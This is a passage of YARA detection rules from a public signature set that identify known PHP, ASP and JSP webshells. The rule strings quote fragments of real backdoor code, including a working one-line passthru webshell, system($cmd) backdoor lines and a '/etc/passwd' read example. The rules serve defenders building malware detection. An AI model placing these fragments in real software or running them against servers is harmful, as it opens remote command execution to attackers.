		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d413d4700daed07561c9f95e1468fb80238fbf3c"
		logic_hash = "5ecfc5f6da471bd3037228c0bc762d50762933af3cf6674210c7b2017a45a646"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s8 = "$encoded = base64_encode(file_get_contents($d.$f)); " fullword
		$s9 = "$file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y"
		$s10 = "else {$tmp = htmlspecialchars(\"./dump_\".getenv(\"SERVER_NAME\").\"_\".$sq"
		$s11 = "$c99sh_sourcesurl = \"http://locus7s.com/\"; //Sources-server " fullword
		$s19 = "$nixpwdperpage = 100; // Get first N lines from /etc/passwd " fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Jspwebshell_1_2
{
	meta:
		description = "PHP Webshells Github Archive - file JspWebshell_1.2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "dfd8c88d-4fe2-5786-9d71-65dba525c358"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6009-L6025"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0bed4a1966117dd872ac9e8dceceb54024a030fa"
		logic_hash = "13e696c1c671d7fda832c84f150e3f41ed55bf888c4bebfeb06ea68d6be65527"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword
		$s1 = "String password=request.getParameter(\"password\");" fullword
		$s3 = "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java."
		$s7 = "String editfile=request.getParameter(\"editfile\");" fullword
		$s8 = "//String tempfilename=request.getParameter(\"file\");" fullword
		$s12 = "password = (String)session.getAttribute(\"password\");" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Safe0Ver
{
	meta:
		description = "PHP Webshells Github Archive - file safe0ver.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a7fc8c89-f7a1-5958-823a-763dedb3066d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6026-L6043"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "366639526d92bd38ff7218b8539ac0f154190eb8"
		logic_hash = "ae5de63b79804cf8c99bc5ea0c8862cf05e4085451d2b516cf95565bf32f3876"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "$scriptident = \"$scriptTitle By Evilc0der.com\";" fullword
		$s4 = "while (file_exists(\"$lastdir/newfile$i.txt\"))" fullword
		$s5 = "else { /* <!-- Then it must be a File... --> */" fullword
		$s7 = "$contents .= htmlentities( $line ) ;" fullword
		$s8 = "<br><p><br>Safe Mode ByPAss<p><form method=\"POST\">" fullword
		$s14 = "elseif ( $cmd==\"upload\" ) { /* <!-- Upload File form --> */ " fullword
		$s20 = "/* <!-- End of Actions --> */" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Uploader
{
	meta:
		description = "PHP Webshells Github Archive - file Uploader.php"
		author = "Florian Roth (Nextron Systems)"
		id = "c68e15d9-865e-5269-a91c-00619fe76305"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6044-L6055"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "e216c5863a23fde8a449c31660fd413d77cce0b7"
		logic_hash = "c4b915f60a952131caa2c4f5bb2eea85ef25f27cabb8ad36a6bb928433558954"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "move_uploaded_file($userfile, \"entrika.php\"); " fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Kral
{
	meta:
		description = "PHP Webshells Github Archive - file kral.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6056-L6072"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "4cd1d1a2fd448cecc605970e3a89f3c2e5c80dfc"
		logic_hash = "0aded226f4e54c0169b9fbda91458f581ea47f9f8bda61a350b5e6f8b60931f3"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$adres=gethostbyname($ip);" fullword
		$s3 = "curl_setopt($ch,CURLOPT_POSTFIELDS,\"domain=\".$site);" fullword
		$s4 = "$ekle=\"/index.php?option=com_user&view=reset&layout=confirm\";" fullword
		$s16 = "echo $son.' <br> <font color=\"green\">Access</font><br>';" fullword
		$s17 = "<p>kodlama by <a href=\"mailto:priv8coder@gmail.com\">BLaSTER</a><br /"
		$s20 = "<p><strong>Server listeleyici</strong><br />" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Simple_Backdoor_2
{
	meta:
		description = "PHP Webshells Github Archive - file simple-backdoor.php"
		author = "Florian Roth (Nextron Systems)"
		id = "faddd38e-d0c6-5299-9983-53351af1ece5"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "WebShell_simple_backdoor"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6088-L6108"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "edcd5157a68fa00723a506ca86d6cbb8884ef512"
		logic_hash = "655e445e51ec0f1bdce006a72acf3bce95941a349c279c14768760fa9f6f9d76"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->" fullword
		$s1 = "<!--    http://michaeldaw.org   2006    -->" fullword
		$s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword
		$s3 = "        echo \"</pre>\";" fullword
		$s4 = "        $cmd = ($_REQUEST['cmd']);" fullword
		$s5 = "        echo \"<pre>\";" fullword
		$s6 = "if(isset($_REQUEST['cmd'])){" fullword
		$s7 = "        die;" fullword
		$s8 = "        system($cmd);" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Safe_Mode_Bypass_PHP_4_4_2_And_PHP_5_1_2_2
{
	meta:
		description = "PHP Webshells Github Archive - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a504442f-85f2-55a1-8a07-1e0faccf8bc0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6109-L6123"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8fdd4e0e87c044177e9e1c97084eb5b18e2f1c25"
		logic_hash = "fbe1f77e00fbc4e58cbad564e2d96c0381765ac799dfdf6cc2580428c68f97a5"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<option value=\"/etc/passwd\">Get /etc/passwd</option>" fullword
		$s3 = "xb5@hotmail.com</FONT></CENTER></B>\");" fullword
		$s4 = "$v = @ini_get(\"open_basedir\");" fullword
		$s6 = "by PHP Emperor<xb5@hotmail.com>" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Ntdaddy_V1_9
{
	meta:
		description = "PHP Webshells Github Archive - file NTDaddy v1.9.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a175fd28-5dc2-5827-87f0-4117e889e90e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6124-L6138"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "79519aa407fff72b7510c6a63c877f2e07d7554b"
		logic_hash = "fdf8b4bb4980e588ad5ccee2d047660980d39f38617f887c5762dcdb0b858267"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "|     -obzerve : mr_o@ihateclowns.com |" fullword
		$s6 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword
		$s13 = "<form action=ntdaddy.asp method=post>" fullword
		$s17 = "response.write(\"<ERROR: THIS IS NOT A TEXT FILE>\")" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Lamashell
{
	meta:
		description = "PHP Webshells Github Archive - file lamashell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "60e39eed-baa2-5999-8560-0a0242ce2608"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6139-L6155"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b71181e0d899b2b07bc55aebb27da6706ea1b560"
		logic_hash = "e58dbd6b9c65a139828890a3fadfad9031580fe189066489d266d37d7078ad98"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "if(($_POST['exe']) == \"Execute\") {" fullword
		$s8 = "$curcmd = $_POST['king'];" fullword
		$s16 = "\"http://www.w3.org/TR/html4/loose.dtd\">" fullword
		$s18 = "<title>lama's'hell v. 3.0</title>" fullword
		$s19 = "_|_  O    _    O  _|_"
		$s20 = "$curcmd = \"ls -lah\";" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Simple_PHP_Backdoor_By_DK
{
	meta:
		description = "PHP Webshells Github Archive - file Simple_PHP_backdoor_by_DK.php"
		author = "Florian Roth (Nextron Systems)"
		id = "2c424714-1d2c-5b89-b1bc-a201e37a0a5d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6156-L6171"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "03f6215548ed370bec0332199be7c4f68105274e"
		logic_hash = "1f65f759ec4045c521085aad84d0aea4dcfcf26eac4357751cf1dde6886d1718"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->" fullword
		$s1 = "<!--    http://michaeldaw.org   2006    -->" fullword
		$s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword
		$s6 = "if(isset($_REQUEST['cmd'])){" fullword
		$s8 = "system($cmd);" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Moroccan_Spamers_Ma_Edition_By_Ghost
{
	meta:
		description = "PHP Webshells Github Archive - file Moroccan Spamers Ma-EditioN By GhOsT.php"
		author = "Florian Roth (Nextron Systems)"
		id = "4fa9ce70-d300-55fe-bf98-636f026317ec"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6172-L6185"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "31e5473920a2cc445d246bc5820037d8fe383201"
		logic_hash = "0e3d2d97665b8849d121d63a22baf7393047a814dde3753e395418c1868b59be"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "$content = chunk_split(base64_encode($content)); " fullword
		$s12 = "print \"Sending mail to $to....... \"; " fullword
		$s16 = "if (!$from && !$subject && !$message && !$emaillist){ " fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_C99Madshell_V__2_0_Madnet_Edition
{
	meta:
		description = "PHP Webshells Github Archive - file C99madShell v. 2.0 madnet edition.php"
		author = "Florian Roth (Nextron Systems)"
		id = "51db0495-14f3-527e-865b-1405db57ff27"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6186-L6201"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "f99f8228eb12746847f54bad45084f19d1a7e111"
		logic_hash = "7cf825a604783ebc74b1dca53aaff5c886957c562e11276f2acce5ff1f6ab991"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$md5_pass = \"\"; //If no pass then hash" fullword
		$s1 = "eval(gzinflate(base64_decode('"
		$s2 = "$pass = \"\";  //Pass" fullword
		$s3 = "$login = \"\"; //Login" fullword
		$s4 = "//Authentication" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Cmdasp_Asp_Php
{
	meta:
		description = "PHP Webshells Github Archive - file CmdAsp.asp.php.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "184b1731-31a9-5040-aa25-d145e8064758"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6202-L6221"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "cb18e1ac11e37e236e244b96c2af2d313feda696"
		logic_hash = "0fd9c7e83ad9ddf5cf88f1d1573324d9f24ae03a1951446fe11c116fd0cf4932"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword
		$s4 = "' Author: Maceo <maceo @ dogmile.com>" fullword
		$s5 = "' -- Use a poor man's pipe ... a temp file -- '" fullword
		$s6 = "' --------------------o0o--------------------" fullword
		$s8 = "' File: CmdAsp.asp" fullword
		$s11 = "<-- CmdAsp.asp -->" fullword
		$s14 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword
		$s16 = "Set oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")" fullword
		$s19 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword

	condition:
		4 of them
}

rule SIGNATURE_BASE_Webshell_NCC_Shell
{
	meta:
		description = "PHP Webshells Github Archive - file NCC-Shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "3a2dab3d-faf0-52a5-b114-db402885c618"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6222-L6238"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "64d4495875a809b2730bd93bec2e33902ea80a53"
		logic_hash = "c58edc548b7804be25f6956e9407cc9f8c74dfd8651f601a87ba639284e612d9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = " if (isset($_FILES['probe']) and ! $_FILES['probe']['error']) {" fullword
		$s1 = "<b>--Coded by Silver" fullword
		$s2 = "<title>Upload - Shell/Datei</title>" fullword
		$s8 = "<a href=\"http://www.n-c-c.6x.to\" target=\"_blank\">-->NCC<--</a></center></b><"
		$s14 = "~|_Team .:National Cracker Crew:._|~<br>" fullword
		$s18 = "printf(\"Sie ist %u Bytes gro" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_README
{
	meta:
		description = "PHP Webshells Github Archive - file README.md"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6239-L6251"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "ef2c567b4782c994db48de0168deb29c812f7204"
		logic_hash = "aa8a9be74bbac08518d5ba442aa6fa37d3f1b255df48b49ccb9842f5728a49d5"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Common php webshells. Do not host the file(s) in your server!" fullword
		$s1 = "php-webshells" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Backupsql
{
	meta:
		description = "PHP Webshells Github Archive - file backupsql.php"
		author = "Florian Roth (Nextron Systems)"
		id = "15d6e967-1e53-53b4-a2cf-7786452495d4"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6252-L6267"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "863e017545ec8e16a0df5f420f2d708631020dd4"
		logic_hash = "0126bfad6eb3861e8322ac3e11b4fd95bc8b88597d916e66c6646d7d5529c1d5"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$headers .= \"\\nMIME-Version: 1.0\\n\" .\"Content-Type: multipart/mixed;\\n\" ."
		$s1 = "$ftpconnect = \"ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog"
		$s2 = "* as email attachment, or send to a remote ftp server by" fullword
		$s16 = "* Neagu Mihai<neagumihai@hotmail.com>" fullword
		$s17 = "$from    = \"Neu-Cool@email.com\";  // Who should the emails be sent from?, may "

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_AK_74_Security_Team_Web_Shell_Beta_Version
{
	meta:
		description = "PHP Webshells Github Archive - file AK-74 Security Team Web Shell Beta Version.php"
		author = "Florian Roth (Nextron Systems)"
		id = "e93a6ac3-080f-53d3-8368-b9feb509a2ea"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6268-L6281"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c90b0ba575f432ecc08f8f292f3013b5532fe2c4"
		logic_hash = "4fbf8f5cab8593fd88e5a430b849e61d7d663c13700f459aa516c5b337d5438b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s8 = "- AK-74 Security Team Web Site: www.ak74-team.net" fullword
		$s9 = "<b><font color=#830000>8. X Forwarded For IP - </font></b><font color=#830000>'."
		$s10 = "<b><font color=#83000>Execute system commands!</font></b>" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Cpanel
{
	meta:
		description = "PHP Webshells Github Archive - file cpanel.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6282-L6298"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "433dab17106b175c7cf73f4f094e835d453c0874"
		logic_hash = "e4dc90c52648f1e5b7dc2d77dcb94feb774ec9e3c156c923c54a9e8f537bbf07"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "function ftp_check($host,$user,$pass,$timeout){" fullword
		$s3 = "curl_setopt($ch, CURLOPT_URL, \"http://$host:2082\");" fullword
		$s4 = "[ user@alturks.com ]# info<b><br><font face=tahoma><br>" fullword
		$s12 = "curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);" fullword
		$s13 = "Powerful tool , ftp and cPanel brute forcer , php 5.2.9 safe_mode & open_basedir"
		$s20 = "<br><b>Please enter your USERNAME and PASSWORD to logon<br>" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Accept_Language
{
	meta:
		description = "PHP Webshells Github Archive - file accept_language.php"
		author = "Florian Roth (Nextron Systems)"
		id = "343ed2a4-4bed-5e73-8d05-f9573b0147af"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6299-L6310"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "180b13576f8a5407ab3325671b63750adbcb62c9"
		logic_hash = "6d45071722268f5b39b1486a7dce883ecefb2b3c9993357b7b58bd603ff1c40d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?php passthru(getenv(\"HTTP_ACCEPT_LANGUAGE\")); echo '<br> by q1w2e3r4'; ?>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_529
{
	meta:
		description = "PHP Webshells Github Archive - file 529.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6311-L6328"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "ba3fb2995528307487dff7d5b624d9f4c94c75d3"
		logic_hash = "f46b84d51077f157c83cd01534dfe7f9cd0d9ef04ad9935ced22d2abc873c171"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<p>More: <a href=\"/\">Md5Cracking.Com Crew</a> " fullword
		$s7 = "href=\"/\" title=\"Securityhouse\">Security House - Shell Center - Edited By Kin"
		$s9 = "echo '<PRE><P>This is exploit from <a " fullword
		$s10 = "This Exploit Was Edited By KingDefacer" fullword
		$s13 = "safe_mode and open_basedir Bypass PHP 5.2.9 " fullword
		$s14 = "$hardstyle = explode(\"/\", $file); " fullword
		$s20 = "while($level--) chdir(\"..\"); " fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_STNC_Webshell_V0_8
{
	meta:
		description = "PHP Webshells Github Archive - file STNC WebShell v0.8.php"
		author = "Florian Roth (Nextron Systems)"
		id = "5dc300a2-9965-52e3-a382-b8d327eb7029"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6329-L6342"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "52068c9dff65f1caae8f4c60d0225708612bb8bc"
		logic_hash = "c2067a1b78c441aa05366b612090e0df895c621843038cc9e65beb6719c0cb9a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "if(isset($_POST[\"action\"])) $action = $_POST[\"action\"];" fullword
		$s8 = "elseif(fe(\"system\")){ob_start();system($s);$r=ob_get_contents();ob_end_clean()"
		$s13 = "{ $pwd = $_POST[\"pwd\"]; $type = filetype($pwd); if($type === \"dir\")chdir($pw"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Tryag
{
	meta:
		description = "PHP Webshells Github Archive - file tryag.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6343-L6358"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "42d837e9ab764e95ed11b8bd6c29699d13fe4c41"
		logic_hash = "2af3bbe8d1940e60843f3f5d40c9c6550e76df21568c374f7a871f73aeefae44"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<title>TrYaG Team - TrYaG.php - Edited By KingDefacer</title>" fullword
		$s3 = "$tabledump = \"DROP TABLE IF EXISTS $table;\\n\"; " fullword
		$s6 = "$string = !empty($_POST['string']) ? $_POST['string'] : 0; " fullword
		$s7 = "$tabledump .= \"CREATE TABLE $table (\\n\"; " fullword
		$s14 = "echo \"<center><div id=logostrip>Edit file: $editfile </div><form action='$REQUE"

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Dc3_Security_Crew_Shell_Priv_2
{
	meta:
		description = "PHP Webshells Github Archive - file dC3 Security Crew Shell PRiV.php"
		author = "Florian Roth (Nextron Systems)"
		id = "1d4a95c4-8128-504d-958f-dcc5c68f4975"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6359-L6374"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "9077eb05f4ce19c31c93c2421430dd3068a37f17"
		logic_hash = "52dc0449c205ff9105e2dedc3cb4858f83a2efc7bae579656a26da493dc59500"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "@rmdir($_GET['file']) or die (\"[-]Error deleting dir!\");" fullword
		$s9 = "header(\"Last-Modified: \".date(\"r\",filemtime(__FILE__)));" fullword
		$s13 = "header(\"Content-type: image/gif\");" fullword
		$s14 = "@copy($file,$to) or die (\"[-]Error copying file!\");" fullword
		$s20 = "if (isset($_GET['rename_all'])) {" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Qsd_Php_Backdoor
{
	meta:
		description = "PHP Webshells Github Archive - file qsd-php-backdoor.php"
		author = "Florian Roth (Nextron Systems)"
		id = "f8208851-159c-5d0b-91ad-478aeb4fc9fd"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6375-L6389"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "4856bce45fc5b3f938d8125f7cdd35a8bbae380f"
